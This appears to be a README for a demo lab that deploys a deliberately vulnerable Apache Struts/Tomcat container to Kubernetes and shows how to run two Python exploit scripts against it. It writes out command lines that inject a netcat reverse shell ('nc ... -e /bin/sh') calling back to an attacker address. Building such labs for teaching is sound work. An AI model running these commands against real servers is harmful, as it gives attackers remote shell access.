# Struts Remote Code Execution Demo
Modified scripts that demonstrate remote code execution (RCE) vi command injection into HTML traffic on old version of Apache Tomcat.   
The yaml file will deploy vulnerable container running struts super-app via apache tomcat ver 8.5.29 java website.
The image is pulled via `https://hub.docker.com/repository/docker/skywalke34/struts`

## To deploy the container via yaml file to kubernetes cluster:
`kubectl create namespace struts`

`kubectl create -f struts.yaml -n struts`

A service will be created that exposes the super-app website.

To get the ip address of the service:
`kubectl get svc,pods -n struts`
The Apache console will be accessible via `http://<service-ip-address>:8080/`

To access the super-app website, also use the service IP address on port 8080/super-app/orders

*Example:* `http://<:8080/super-app/orders`

Use the IP address from the website with the python scripts to inject a netcat command and sh command to establish a reverse shell from the container.

**struts1.py example**: (insert your own IP addresses / port for the reverse shell)
`python3 struts1.py http://xxx.xxx.xxx.xxx:8080/super-app/orders/3 'nc -nv 123.456.789.001 1337 -e /bin/sh`'

**struts-pwn2.py example:**
`python struts-pwn2.py --exploit --url 'http://xxx.xxx.xxx.xxx:8080/super-app/orders/3' -c 'nc -nv 123.456.789.100 1337 -e /bin/sh'`
